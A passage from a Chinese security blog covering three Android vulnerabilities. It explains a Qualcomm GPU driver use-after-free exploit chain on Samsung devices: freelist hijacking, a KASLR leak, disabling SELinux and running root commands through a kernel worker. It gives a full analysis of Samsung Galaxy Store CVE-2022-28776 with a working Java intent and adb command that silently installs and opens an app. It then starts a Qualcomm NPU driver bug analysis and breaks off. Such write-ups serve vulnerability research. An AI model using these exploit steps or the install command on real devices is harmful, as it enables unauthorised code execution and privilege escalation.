使用ion缓冲区的一个特殊原因是，用户可以请求具有连续物理地址的内存。这一点特别重要，因为有些设备（如硬件上的设备，而不是手机本身）直接访问物理内存，拥有连续的内存地址可以大大改善这种内存访问的性能，而有些设备不能处理非连续的物理内存。 与SWIOTLB类似，为了确保具有请求大小的连续物理内存区域可用，ion驱动在启动初期就分配了这些内存区域，并将其作为内存池（”划出的区域”），然后在以后的请求中用于分配ion缓冲区。并非ion设备中的所有内存池都是连续的内存（例如，通用的 “系统堆 “可能不是物理上连续的区域），但是用户可以在使用ION_IOC_ALLOC时指定heap_id_mask来指定具有特定属性（例如，连续的物理内存）的ion堆。 这些内存池在如此早的阶段被分配，意味着它们的地址是可预测的，只取决于硬件的配置（设备树、可用内存、内存起始地址、各种启动参数等）。这尤其意味着，如果使用ION_IOC_ALLOC从一个很少使用的内存池中分配一个ion缓冲区，这个缓冲区很可能被分配到一个可预测的地址。如果使用mmap将缓冲区映射到用户空间，就可以在任何时候访问这个可预测地址的内存了。 经过一些实验，似乎user_contig_region几乎从未被使用，每次都能把整个区域映射到用户空间。所以在这个漏洞中，作者使用了这个内存池，并假设可以分配整个区域以保持简单。(在不影响可靠性的情况下，修改漏洞以适应部分区域不可用的情况是很容易的)。 现在能够把受控的数据放在一个可预测的地址上，可以解决之前在利用中遇到的问题。回顾一下，当dma_fence_release在假 fence 对象上被调用时： 12345678void dma_fence_release(struct kref *kref){ ... if (fence-&gt;ops-&gt;release) fence-&gt;ops-&gt;release(fence); else dma_fence_free(fence);} 还有一个问题，需要fence-&gt;ops指向一个包含所有零的有效地址，这样fence-&gt;ops-&gt;release就不会被调用（因为在这个阶段没有一个有效的函数地址与fence-&gt;ops-&gt;release的签名相匹配，走这个路径会使内核崩溃）。 由于ion缓冲区在一个可预测的地址上，可以简单地把它填为零，让fence-&gt;ops指向那里。这将确保dma_fence_free路径被采取，然后释放假对象，形成一个double free的原形，同时防止内核崩溃。在继续利用这个double free原语之前，还有一个问题需要首先解决。 Escaping an infinite loop回顾一下，在kgsl_ioctl_timeline_destroy函数中，在fence对象被销毁和替换后，会执行以下循环： 1234567spin_lock_irq(&amp;timeline-&gt;lock);list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base);}spin_unlock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe 将首先从 list_head temp 中获取下一个指针，找到列表中的第一个fence条目，然后通过跟踪 fence-&gt;node 中的下一个指针进行迭代，直到下一个条目再次指向 temp。如果下一个条目没有指向temp，那么这个循环就会继续。这是一个变量初始化使利用更加困难的地方。看看kgsl_timeline_fence的结构，它嵌入了一个dma_fence对象，被添加到kgsl_timeline中： 12345struct kgsl_timeline_fence { struct dma_fence base; struct kgsl_timeline *timeline; struct list_head node;}; 可以看到node字段是kgsl_timeline_fence中的最后一个字段，而为了构建这个漏洞，只需要用受控数据替换base。如果用部分对象替换，上述问题就会很容易解决了。在没有自动变量初始化的情况下，如果只将释放的kgsl_timeline_fence替换成一个dma_fence大小的对象，那么字段timeline和node将保持不变，并包含有效数据。这将导致node中的下一个指针有效，并允许kgsl_ioctl_timeline_destroy的循环正常退出。然而，在自动变量初始化的情况下，即使把释放的kgsl_timeline_fence对象换成一个更小的对象，整个内存块也会首先被设置为零，抹去kgsl_timeline和node，这意味着必须伪造node字段，以便： 下一个指针指向一个有效的地址，以避免立即崩溃，事实上，不止如此，它需要指向一个对象，这个对象是另一个假的kgsl_timeline_fence，可以被循环中的函数（dma_fence_set_error、dma_fence_signal_locked和dma_fence_put）操作而不崩溃。这意味着需要制作更多的假对象。 这些假的kgsl_timeline_fence对象中的一个下一个指针指向了退出循环的temp列表，这是一个堆栈分配的变量。 第一个要求并不难，因为现在可以使用ion缓冲器来创建这些假的kgsl_timeline_fence对象。然而，第二个要求则要难得多： 这将导致一个无限循环，并耽误CPU。虽然它很难看，但假的对象应该能解决取消引用的问题并避免崩溃，所以它可能不是一个致命的问题。不幸的是，由于该循环在自旋锁内运行，在运行了一小段时间后，看门狗似乎会将其标记为占用CPU的问题并触发内核恐慌。所以，需要找到一种方法来退出循环，而且是快速退出。 看看函数dma_fence_signal_locked： 123456789101112131415int dma_fence_signal_locked(struct dma_fence *fence){ ... struct list_head cb_list; ... /* Stash the cb_list before replacing it with the timestamp */ list_replace(&amp;fence-&gt;cb_list, &amp;cb_list); //&lt;-- 1. ... list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) { //&lt;-- 2. INIT_LIST_HEAD(&amp;cur-&gt;node); cur-&gt;func(fence, cur); } return 0;} 这个函数将对列表temp中的每个假dma_fence（原始已释放的和替换的dma_fence，加上它在ion buffer中链接的那些）运行。如前所述，如果运行上面2处的代码，那么内核可能会崩溃，因为不能提供一个有效的func，所以还是避免运行这个路径。 为了能够运行这段代码而不是上面2中的循环代码，需要将fence.cb_list初始化为一个空列表，这样它的next和prev都指向它自己。这对于被漏洞释放的初始假dma_fence来说是不可能的，因为fence的地址以及fence.cb_list是未知的，所以不得不对这个第一个假对象完全避免使用list_replace代码。然而，由于随后链接到它的假dma_fence对象是在一个已知地址的ion缓冲区中，现在可以为这些对象创建一个空的cb_list，将next和prev指针都设置为fence.cb_list字段的地址。 123456789101112static inline void list_replace(struct list_head *old, struct list_head *new){ //old-&gt;next = &amp;(fence-&gt;cb_list) new-&gt;next = old-&gt;next; //new-&gt;next = &amp;(fence-&gt;cb_list) =&gt; fence-&gt;cb_list.prev = &amp;cb_list new-&gt;next-&gt;prev = new; //new-&gt;prev = fence-&gt;cb_list.prev =&gt; &amp;cb_list new-&gt;prev = old-&gt;prev; //&amp;cb_list-&gt;next = &amp;cb_list new-&gt;prev-&gt;next = new;} 在list_replace之后，堆栈变量cb_list的地址已经被写入了fence-&gt;cb_list.prev，它在ion缓冲区的某处。由于ion缓冲区被映射到了用户空间，可以通过轮询ion缓冲区简单地读取这个地址。由于dma_fence_signal_locked是在堆栈变量temp被分配后在kgsl_ioctl_timeline_destroy里面运行。 123456789101112131415161718long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... struct list_head temp; ... spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); //cb_list, is a stack variable allocated inside `dma_fence_signal_locked` dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base); } spin_unlock_irq(&amp;timeline-&gt;lock); ...} 有了cb_list的地址，就可以计算temp的地址，（它与cb_list的地址有一个固定的偏移），所以通过轮询cb_list的地址，然后用它来计算temp的地址，并把它写回ion缓冲区中一个假的kgsl_timeline_fence对象的下一个指针，可以在看门狗咬人之前退出循环。 Hijacking the freelistdma_fence_put将减少假对象的refcount，如果refcount达到0，它将调用dma_fence_free，然后用kfree_rcu释放该对象。现在假设假对象将被kfree_rcu释放。通过用另一个对象再次替换这个假对象，就可以得到对同一个对象的两个引用，将能够在任何时候使用这些对象的句柄释放这些对象。一般的想法是，当一个内存块被释放时，指向下一个自由块的freelist指针将被写入内存块的前8字节。如果从一个句柄中释放对象，然后用另一个句柄修改这个被释放的对象的前8字节，那么就可以劫持freelist指针，让它指向选择的地址，这就是下一次分配将发生的地方。 为了能够修改对象分配后的前8字节，这里使用“Mitigations are attack surface too”中使用的signalfd对象。signalfd系统调用分配了一个8字节的对象来存储signalfd文件的掩码，这个掩码可以由用户指定，但有一些小限制。所分配对象的寿命与返回给用户的signalfd文件相联系，可以通过关闭该文件轻松控制。此外，这个对象的前8个字节可以通过用不同的掩码再次调用signalfd来改变。 为了劫持freelist指针： 触发UAF bug，用一个通过sendmsg分配的假的dma_fence对象替换已释放的对象，这样dma_fence_free将被调用，用kfree_rcu释放这个假对象。 用signalfd堆喷，在sendmsg对象被释放后，在同一地址分配另一个对象。 释放sendmsg对象，使freelist指针被写入第二步中signalfd对象的掩码。 修改signalfd对象的掩码，使freelist指针现在指向一个指定的地址，然后再次堆喷，在该地址分配对象。 如果将freelist指针的地址设置为我们控制的ion缓冲区的地址，那么随后的分配将把对象放入ion缓冲区，然后可以随时访问和修改，即，可以在一个有读和写权限的区域内伪造自己的内核堆。 这个方案的主要障碍来自于kfree_rcu和运行dma_fence_put的CPU在调用kfree_rcu后将暂时陷入一个繁忙的循环。回顾上一节，在能够通过将 temp 列表的地址写入假的kgsl_timeline_fence::node对象的下一个指针来退出循环之前，这个循环将一直运行。这意味着，一旦调用kfree_rcu，dma_fence_put被退出，该循环将继续处理运行kfree_rcu的CPU上的其他假dma_fence对象。正如前面所解释的，kfree_rcu不会立即释放一个对象，而是延迟移除。大多数情况下，释放将实际发生在调用kfree_rcu的同一个CPU上。然而，在这种情况下，由于运行kfree_rcu的CPU因为运行循环而在 spinlock 中保持繁忙，对象几乎肯定不会在同一个CPU上被释放。相反，一个不同的CPU将被用来释放该对象。这导致了一个问题，因为对象替换的可靠性取决于用于释放对象的CPU。当一个对象在CPU上被释放时，内存分配器将把它放在每个CPU的缓存中。紧接着在同一CPU上进行的分配将首先在CPU缓存中寻找空闲空间，并且很可能会替换那个新释放的对象。然而，如果分配发生在不同的CPU上，那么它很可能会替换不同CPU缓存中的一个对象，而不是新释放的对象。不知道哪个CPU负责释放对象，再加上对象被释放的时间不确定（因为kfree_rcu引入的延迟），意味着可能很难替换对象。然而，在实践中，简单地运行一个循环，在每个CPU上喷射物体，并以一定的间隔重复喷射，以考虑到时间上的不确定性（成功率大于70%）。 漏洞中使用的另一个小修改是，在sendmsg对象被释放后，用另一轮signalfd堆喷来替换它们。这是为了确保这些sendmsg对象不会意外地被不控制的对象所替换，从而干扰了漏洞的利用，同时也是为了更容易识别实际被破坏的对象。 现在可以劫持freelist并将新的对象分配重定向到可以随时自由访问的ion缓冲区，现在需要将其变成一个任意的内存读写原语。 The Device Memory Mirroring Attack内核驱动经常需要将内存映射到用户空间，因此，经常有一些结构包含指向page结构或sg_table结构的指针。这些结构通常包含指向页面的指针，这些页面将被映射到用户空间，例如，当调用mmap时。这使得它们成为非常好的破坏目标。例如，ion_buffer对象在所有的Android设备上都可用。它有一个sg_table结构，包含了当mmap被使用时将被映射到用户空间的页面的信息。 除了可以广泛使用和从不可信任的应用程序中访问外，ion_buffer对象还解决了一些其他问题，所以在下面的内容中，将使用上面的freelist劫持原语，在有任意读写权限的ion缓冲区备份存储中分配一个ion_buffer结构。通过这样做，可以随意破坏所有被分配的 ion_buffer 结构中的数据。为了避免混淆，从现在开始，将使用术语 “假内核堆 “来表示用作假内核堆的ion缓冲区备份存储，以及在假内核堆中分配的用作破坏目标的结构的ion_buffer。 这里的总体想法是，通过在假的内核堆中分配ion_buffer结构，将能够修改ion_buffer结构，用受控数据替换其sg_table。sg_table结构包含一个scatterlist结构，表示支持ion_buffer结构的页面集合。 123456789101112131415struct sg_table { struct scatterlist *sgl; /* the list */ unsigned int nents; /* number of mapped entries */ unsigned int orig_nents; /* original size of list */};struct scatterlist { unsigned long page_link; unsigned int offset; unsigned int length; dma_addr_t dma_address;#ifdef CONFIG_NEED_SG_DMA_LENGTH unsigned int dma_length;#endif}; scatterlist中的page_link字段是一个页面指针的编码形式，表明ion_buffer结构的备份存储所在的实际页面。 1234567static inline struct page *sg_page(struct scatterlist *sg){#ifdef CONFIG_DEBUG_SG BUG_ON(sg_is_chain(sg));#endif return (struct page *)((sg)-&gt;page_link &amp; ~(SG_CHAIN | SG_END));} 当mmap被调用时，由page_link编码的页面将被映射到用户空间。 12345678910111213141516int ion_heap_map_user(struct ion_heap *heap, struct ion_buffer *buffer, struct vm_area_struct *vma){ struct sg_table *table = buffer-&gt;sg_table; ... for_each_sg(table-&gt;sgl, sg, table-&gt;nents, i) { struct page *page = sg_page(sg); ... //Maps pages to user space ret = remap_pfn_range(vma, addr, page_to_pfn(page), len, vma-&gt;vm_page_prot); ... } return 0;} 由于 page 指针只是页面物理地址的逻辑移位，然后是一个恒定的线性偏移（见phys_to_page的定义），能够控制page_link就可以把一个任意的页面映射到用户空间。对于许多设备来说，这就足以实现任意的内核内存读写，因为内核映像是在一个固定的物理地址上映射的（KASLR随机化了这个固定物理地址的虚拟地址偏移），所以在处理物理地址的时候不需要担心KASLR。 然而，三星设备以不同的方式进行KASLR。内核镜像的物理地址不是映射到一个固定的物理地址，而是随机化的（严格来说，是内核认为的中间物理地址，这不是真正的物理地址，而是由管理程序给出的虚拟地址）。所以在我们的案例中，仍然需要泄露一个地址来打败KASLR。然而，有了假的内核堆，这就相当容易实现了。一个ion_buffer对象包含一个指向ion_heap的指针，它负责为ion_buffer分配后备存储。 12345struct ion_buffer { struct list_head list; struct ion_heap *heap; ...}; 虽然ion_heap在内核镜像中不是一个全局对象，但每个ion_heap都包含一个ion_heap_ops字段，它指向特定ion_heap对象的相应 vtable。 123456struct ion_heap { struct plist_node node; enum ion_heap_type type; struct ion_heap_ops *ops; ...} 上面的ops字段是内核镜像中的一个全局对象。如果能够读取ion_buffer-&gt;heap-&gt;ops，那么也能够得到一个地址来打败KASLR，将内核镜像中的地址翻译成物理地址。这可以按以下方法进行。 首先在假的内核堆中找到ion_buffer结构的位置。这可以通过ion_buffer中的flags字段来完成。 12345struct ion_buffer { struct list_head list; struct ion_heap *heap; unsigned long flags; ... 这是在创建ion_buffer时从ION_IOC_ALLOC ioctl的参数中传递的4个字节的值。可以将这些设置为特定的 “魔法 “值，并在假的内核堆中搜索它们。 一旦找到ion_buffer结构，读取其堆指针。这将是内核镜像之外的低内存区域的一个虚拟地址，因此，它的物理地址可以通过应用常数偏移来获得。 一旦获得相应的ion_heap对象的物理地址，修改ion_buffer的sg_table，使其后备存储指向包含ion_heap的页面。 在ion_buffer的文件描述符上调用mmap，这将把包含ion_heap的页面映射到用户空间。然后可以直接从用户空间读取该页以获得OPS指针，这将提供KASLR的偏移。 ion_buffer结构的使用也解决了另一个问题。虽然假内核堆很方便，但它并不完美。每当假内核堆中的一个对象被释放时，kfree将使用PageSlab检查来检查包含该对象的页面是否是来自SLUB分配器的单页slab。如果检查失败，那么PageCompound检查将被执行，以检查该页是否是一个更大的slab的一部分。 12345678910111213141516171819void kfree(const void *x){ struct page *page; void *object = (void *)x; trace_kfree(_RET_IP_, x); if (unlikely(ZERO_OR_NULL_PTR(x))) return; page = virt_to_head_page(x); if (unlikely(!PageSlab(page))) { //&lt;-------- check if the page allocated is a single page slab unsigned int order = compound_order(page); BUG_ON(!PageCompound(page)); //&lt;-------- check if the page is allocated as part of a multipage slab ... } ...} 由于这些检查是在包含页面元数据的页面结构本身上进行的，因此只要有对象被释放，它们就会失败并导致内核崩溃。这可以通过使用现在拥有的任意读写原语来覆盖页面结构中各自的元数据来解决（对应于物理地址的页面结构的地址只是物理地址的逻辑移动，然后是固定偏移量的转换，所以可以将包含页面结构的页面映射到用户空间并修改其内容）。然而，如果能够确保占据假内核堆的对象永远不会被释放，那就更简单了。在ion_buffer结构被释放之前，会调用ion_buffer_destroy。 123456789101112int ion_buffer_destroy(struct ion_device *dev, struct ion_buffer *buffer){ ... heap = buffer-&gt;heap; ... if (heap-&gt;flags &amp; ION_HEAP_FLAG_DEFER_FREE) ion_heap_freelist_add(heap, buffer); //&lt;--------- does not free immediately else ion_buffer_release(buffer); return 0;} 如果ion_heap包含标志ION_HEAP_FLAG_DEFER_FREE，那么ion_buffer不会立即被释放，而是通过ion_heap_freelist_add被添加到ion_heap的free_list。添加到这个列表中的ion_buffer对象只有在以后需要的时候才会被释放，而且只有在ION_HEAP_FLAG_DEFER_FREE标志被设置的情况下。当然，通常情况下，ION_HEAP_FLAG_DEFER_FREE在ION_heap的生命周期内不会改变，但是通过我们的任意内存写入基元，可以简单地将ION_HEAP_FLAG_DEFER_FREE添加到ION_heap-&gt;flags中，释放ION_buffer，然后再次移除ION_HEAP_FLAG_DEFER_FREE，ION_buffer将只是停留在ION_heap的freelist中而永远不会被释放。此外，包含ion_heap对象的页面已经被映射，目的是为了绕过KASLR，所以切换该标志是相当微不足道的。通过喷洒假的内核堆，使其充满了ion_buffer对象及其附属物，可以确保这些对象永远不会被释放，避免内核崩溃。 Bypassing SELinux当SELinux被启用时，它可以在 permissive 模式或 enforcing 模式下运行。当处于 permissive 模式时，它将只审计和记录未经授权的访问，但不会阻止它们。SELinux的运行模式是由selinux_enforcing变量控制的。如果这个变量为零，那么SELinux就以 permissive 模式运行。通常，对系统安全至关重要的变量会受到三星内核数据保护（KDP）的保护，通过使用__kdp_ro或__rkp_ro属性将其标记为只读。这个属性表明该变量处于只读页面，其修改受到管理程序调用的保护。然而，在5.x分支的高通内核中，三星似乎忘记了保护这个变量（又是这样吗！）。 1234//In security/selinux/hooks.c#ifdef CONFIG_SECURITY_SELINUX_DEVELOPstatic int selinux_enforcing_boot;int selinux_enforcing; 所以，可以直接将selinux_enforcing覆盖为零，并将SELinux设置为permissive模式。虽然还有其他绕过SELinux的方法（比如Valentina Palmiotti在这个漏洞中使用的方法），但此时的捷径更受欢迎，所以将直接设置selinux_enforcing变量。 Running arbitrary root commands using ret2kworker(TM)在三星设备上获得root权限的一个众所周知的问题是三星的RKP（实时内核保护）所施加的保护。在安卓设备上获得root权限的一个常见方法是用root权限覆盖我们自己进程的证书。然而，三星的RKP写保护每个进程的凭证，所以这在这里是不可能的。在作者的上一次利用中，能够以root身份执行任意代码，因为所利用的特定UAF导致一个受控函数指针在以root身份运行的kworker的代码中被执行。 当然，通过任意的内存读写原语，可以简单地将对象添加到这些工作队列之一（基本上是包含工作结构的链接列表），并等待一个kworker来接取工作。事实证明，许多这些工作队列确实是静态的全局对象，在内核镜像中具有固定的地址。 1234567ffffffc012c8f7e0 D system_wqffffffc012c8f7e8 D system_highpri_wqffffffc012c8f7f0 D system_long_wqffffffc012c8f7f8 D system_unbound_wqffffffc012c8f800 D system_freezable_wqffffffc012c8f808 D system_power_efficient_wqffffffc012c8f810 D system_freezable_power_efficient_wq 因此，将条目添加到这些工作队列中并让kworker来处理这些工作是比较直接的。然而，由于kCFI，只能调用具有以下签名的函数。 1void (func*)(struct work_struct *work) 是否能找到一个足够强大的函数来运行？结果相当简单。函数call_usermodehelper_exec_work，通常在内核漏洞中被用来运行shell命令，它符合这个要求，可以运行提供的shell命令。因此，通过修改，比如说，system_unbound_wq，并在其中添加一个持有call_usermodehelper_exec_work指针的条目，可以绕过三星的RKP和kCFI，以root身份运行任意命令。 复现情况需要Snapdragon 888及以上芯片的测试机，目前没有。 参考链接The Android kernel mitigations obstacle race The More You Know, The More You Know You Don’t Know","link":"/2022/06/18/Qualcomm-GPU%E9%A9%B1%E5%8A%A8UAF%E6%BC%8F%E6%B4%9E-CVE-2022-22057/"},{"title":"Samsung CVE-2022-28776 - 零点击安装App","text":"影响范围Galaxy Store 4.5.36.4 之前的版本。 效果不需要用户同意（锁屏状态下也能利用），自动下载安装三星应用商店中的App，安装后自动运行，会弹出应用商店的界面。 漏洞详情问题在于 Samsung Galaxy App Store中三个可导出的 activity中： com.sec.android.app.samsungapps.viewpager.InterimActivity com.sec.android.app.samsungapps.interim.essentials.InterimEssentialsActivity com.sec.android.app.samsungapps.downloadableapps.DownloadableAppsActivity 这三个类都有以下特征： 包含以 samsungapps://CategoryList/开头的数据URI； 提取 Extras并添加值为 true的 isFromInterim。 123456789private void a() { Bundle extras = getIntent().getExtras(); if (extras == null) { extras = new Bundle(); } extras.putBoolean(DeepLink.EXTRA_DEEPLINK_IS_FROM_INTERIM, true); DeeplinkUtil deeplinkUtil = new DeeplinkUtil(this); deeplinkUtil.openInternalDeeplink(&quot;samsungapps://CategoryList/&quot; + Constant.GALAXY_ESSENTIALS, extras);} openInternalDeeplink创建了一个新的 Intent，在 Extras中添加一个新的值 sender，这个值被设置为包名，然后将传入的 extras也添加到 Extras中。随后，将 Intent传给类 com.sec.android.app.samsungapps.deeplink.DeepLinkFactory的方法 createDeepLink()。createDeepLink()返回一个 DeepLink，这个 DeepLink随后被设置为 Internal： 12345678910111213141516171819public boolean openInternalDeeplink(String str, Bundle bundle) { if (!Common.isValidString(str)) { return false; } Intent intent = new Intent(); intent.putExtra(&quot;sender&quot;, this.activity.getPackageName()); intent.setData(Uri.parse(str)); if (bundle != null) { intent.putExtras(bundle); } DeepLink createDeepLink = DeepLinkFactory.createDeepLink(intent); if (createDeepLink == null) { return false; } createDeepLink.setIsInternal(true); DeeplinkManager.getInstance().setInternalDeeplink(true); DeepLinkFactoryUtil.sendDeeplinkLaunchingLog(createDeepLink.getDeeplinkUrl(), true); return createDeepLink.runInternalDeepLink(this.a);} createDeepLink()创建的是一个 Product Detail Deeplink的 Deeplink。当然，这个 Deeplink包含之前所有的 Extras： 123456789101112public static DeepLink createDeepLink(final Intent intent) { try { final boolean booleanExtra = intent.getBooleanExtra(&quot;directcall&quot;, false); final String stringExtra = intent.getStringExtra(&quot;GUID&quot;); final Bundle extras = intent.getExtras(); if (booleanExtra &amp;&amp; stringExtra != null &amp;&amp; stringExtra.length() != 0) { final StringBuilder sb = new StringBuilder(); sb.append(&quot;[GADeepLink] ::directcall::&quot;); sb.append(stringExtra); AppsLog.d(sb.toString()); return DeepLinkFactoryUtil.createProductDetailDeepLink(stringExtra, extras); } Deeplink通过类 com.sec.android.app.samsungapps.utility.deeplink.DeepLink进行设置，这个类根据 Intent中 Extras的值，来设置不同的值，如 directInstall： 1234public void initialize(Bundle bundle) { ... this.u = getBundleBoolean(bundle, EXTRA_DEEPLINK_DIRECT_INSTALL, false); ... 然后，创建的 Product Detail Deeplink被当作标准的 DeepLink来处理。类 com.sec.android.app.samsungapps.deeplink. DetailPageDeepLink 的方法 runInternalDeeplink()被调用，并检查 Extras中的 directInstall： 123456789101112131415161718public boolean runInternalDeepLink(Context context) { AppsLog.d(this.a + &quot;::runInternalDeepLink::&quot;); if (launchApp(context, getDetailID())) { return true; } if (this.isStickerApp) { DetailPageHelper.launchStickerDetailFromDeeplink(context, getDetailID(), this.d, getAdSource(), getDeeplinkUrl()); return true; } DetailConstant.DETAIL_TYPE detail_type = DetailConstant.DETAIL_TYPE.COMMON; if (isForGear()) { detail_type = DetailConstant.DETAIL_TYPE.GEAR; } else if (a()) { detail_type = DetailConstant.DETAIL_TYPE.GAME; } DetailPageHelper.launchDetailFromDeeplink(context, getDetailID(), detail_type, this.mSignId, this.mQueryStr, getAdSource(), this.b, getSender(), isDirectInstall(), isDirectOpen(), getType(), this.f, getDeeplinkUrl(), this.mEncodedReferrer); return true;} 类 com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink的方法 putDetailCommonExtra()将被调用： 123456public void putDetailCommonExtra(Context context) { ... if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) { this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall()); this.intent.putExtra(&quot;sender&quot;, getSender()); } enableDDI()方法被调用，由于是 Internal的 DeepLink，所以这里将返回 true： 123456789public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) { if (isDDITestMode()) { return true; } if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) { return false; } return true;} 最后，目标App将被安装。 漏洞利用123456789Intent intent = new Intent();intent.setComponent(new ComponentName(&quot;com.sec.android.app.samsungapps&quot;, &quot;com.sec.android.app.samsungapps.viewpager.InterimActivity&quot;));intent.putExtra(&quot;directcall&quot;, true);intent.putExtra(&quot;isInternal&quot;, true);intent.putExtra(&quot;directInstall&quot;, true);intent.putExtra(&quot;installReferrer&quot;, &quot;com.sec.android.app.samsungapps&quot;);intent.putExtra(&quot;directOpen&quot;, true);intent.putExtra(&quot;GUID&quot;, &quot;com.nianticlabs.pokemongo.ares&quot;);startActivity(intent); 或者adb命令： 1am start -n com.sec.android.app.samsungapps/com.sec.android.app.samsungapps.viewpager.InterimActivity --ez directcall true --ez isInternal true --ez directInstall true --es installReferrer com.sec.android.app.samsungapps --ez directOpen true --es GUID com.nianticlabs.pokemongo.ares","link":"/2022/05/08/Samsung-CVE-2022-28776-%E9%9B%B6%E7%82%B9%E5%87%BB%E5%AE%89%E8%A3%85App/"},{"title":"Qualcomm NPU 驱动漏洞(CVE-2021-1940,CVE-2021-1968,CVE-2021-1969)","text":"前言之前看过华为NPU的漏洞，也整理过NPU逆向的文章，这个漏洞后来也刷到了，但是当时应该是没精力看，就放在文件夹里了。最近又重新看到它，感觉NPU漏洞还是很有意思的，就梳理一下。 背景知识NPU目前移动领域在应用AI计算的时候，有两种方式：一是采用独立的 NPU 芯片；二是，通过CPU、GPU 和 DSP 处理器的协作（异构计算），将不同的 AI 计算需求分配到移动平台中不同的部分，最终高效且快速地完成 AI 计算任务。 目前，高通是采用的第二种方法，也就是Kryo CPU、Adreno GPU 和 Hexagon 处理器，第一款声称支持 AI 计算的芯片是骁龙660，实际在架构上应该更早。 ⚠️ 第一种方式有三个问题： 能耗； 处理 AI 任务时，NPU 与 CPU 之间的交互速度； 新的 NPU 架构对旧的神经网络的兼容性。 后文还是采用高通 NPU 的说法来表示高通芯片的 AI 计算的支持。 攻击面由于 NPU 内核驱动是在 4.14 中引入的，因此，只有内核版本 4.14 或更高版本的手机才会受到影响。还有一点，Pixel 设备虽然也有自己的AI处理单元（edge TPU），但内核驱动程序需要 root 权限才能使用，因此这些漏洞影响不了 Pixel 设备。 在公布这三个漏洞的细节时（2021年11月18日），对三星 NPU 设备的驱动程序的访问受到限制，但采用高通芯片组的设备，仍然可以从不受信任的应用程序中访问高通 NPU 驱动程序。 内核驱动程序先来看看源码的位置：drivers/media/platform/msm/npu，除了与NPU的初始化和关闭有关的各种任务外，它主要负责在 CPU 和 NPU 之间发送 RPC 消息，以及分配共享内存以访问神经网络模型、数据和结果。 该驱动可以通过打开/dev/msm_npu文件来进行交互。当设备驱动文件被打开时，将创建一个npu_client对象。这个npu_client对象在这个文件的所有句柄被关闭后释放。 系统调用 npu_ioctl 表明了驱动所支持的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041424344static long npu_ioctl(struct file *file, unsigned int cmd, unsigned long arg){ int ret = -ENOIOCTLCMD; struct npu_client *client = file-&gt;private_data; switch (cmd) { case MSM_NPU_GET_INFO: ret = npu_get_info(client, arg); break; case MSM_NPU_MAP_BUF: ret = npu_map_buf(client, arg); break; case MSM_NPU_UNMAP_BUF: ret = npu_unmap_buf(client, arg); break; case MSM_NPU_LOAD_NETWORK: ret = npu_load_network(client, arg); break; case MSM_NPU_LOAD_NETWORK_V2: ret = npu_load_network_v2(client, arg); break; case MSM_NPU_UNLOAD_NETWORK: ret = npu_unload_network(client, arg); break; case MSM_NPU_EXEC_NETWORK: ret = npu_exec_network(client, arg); break; case MSM_NPU_EXEC_NETWORK_V2: ret = npu_exec_network_v2(client, arg); break; case MSM_NPU_RECEIVE_EVENT: ret = npu_receive_event(client, arg); break; case MSM_NPU_SET_PROP: ret = npu_set_property(client, arg); break; case MSM_NPU_GET_PROP: ret = npu_get_property(client, arg); break; default: pr_err(&quot;unexpected IOCTL %x\\n&quot;, cmd); } return ret;} npu_map_buf：使用ION allocator分配一个与 NPU 共享的直接内存访问（DMA）缓冲区。然后，这个共享内存可以用来将神经网络模型加载到 NPU 上。 npu_unmap_buf：取消映射用npu_map_buf映射的共享内存。 npu_load_network(_v2)：这两个 API，将神经网络模型加载到 NPU 上。模型数据被存储在使用npu_map_buf映射的共享内存区域。映射的缓冲区的细节需要提供给这个ioctl。这个ioctl将执行一些检查以确保缓冲区是有效的。NPU 内核驱动还将跟踪全局npu_host_ctx的networks阵列中加载的神经网络列表。 npu_unload_network(_v2)：这两个API，用于从 NPU 中删除一个神经网络模型。这也将其从内核驱动中的networks数组中删除掉。 npu_exec_network(_v2)：这两个 API，用于执行从npu_load_network(_v2)加载的神经网络模型。 这些ioctl主要是对输入参数进行一些检查，然后将其重新打包成 RPC 包，并使用npu_send_network_cmd 方法发送。这个方法然后调用npu_host_ipc_send_cmd方法，将 RPC 数据包发布到对应的消息队列： 1234567891011121314static int npu_send_network_cmd(struct npu_device *npu_dev, struct npu_network *network, void *cmd_ptr, bool async){ ... } else { ... ret = npu_host_ipc_send_cmd(npu_dev, IPC_QUEUE_APPS_EXEC, cmd_ptr); if (ret) network-&gt;cmd_pending = false; } return ret;} 这些消息将被 NPU 接收，以执行对应的动作。大多数命令是同步的，意味着内核驱动将发送 RPC ，然后等待 NPU 完成计算，并在ioctl调用完成前回复它。同时也支持异步：npu_exec_network，通过在ioctl参数中提供一个布尔参数async，这个ioctl可以在异步模式下执行，并在 RPC 消息发送完毕后立即返回给用户。 1234567891011121314151617181920212223int32_t npu_host_exec_network(struct npu_client *client, struct msm_npu_exec_network_ioctl *exec_ioctl){ bool async_ioctl = !!exec_ioctl-&gt;async; ... ret = npu_send_network_cmd(npu_dev, network, &amp;exec_packet, async_ioctl); ... if (async_ioctl) { pr_debug(&quot;Async ioctl, return now\\n&quot;); goto exec_done; } ... mutex_unlock(&amp;host_ctx-&gt;lock); ret = wait_for_completion_interruptible_timeout( &amp;network-&gt;cmd_done, (host_ctx-&gt;fw_dbg_mode &amp; FW_DBG_MODE_INC_TIMEOUT) ? NW_DEBUG_TIMEOUT : NW_CMD_TIMEOUT); mutex_lock(&amp;host_ctx-&gt;lock); ...} 异步模式可以使用npu_receive_event ioctl在过段时间后再从 NPU 获取计算的结果。在命令完成后，NPU 将发送一个 RPC 到 CPU，然后由app_msg_proc 方法进行处理。 漏洞漏洞与npu_exec_network的异步模式有关： 使用npu_map_buf映射 NPU 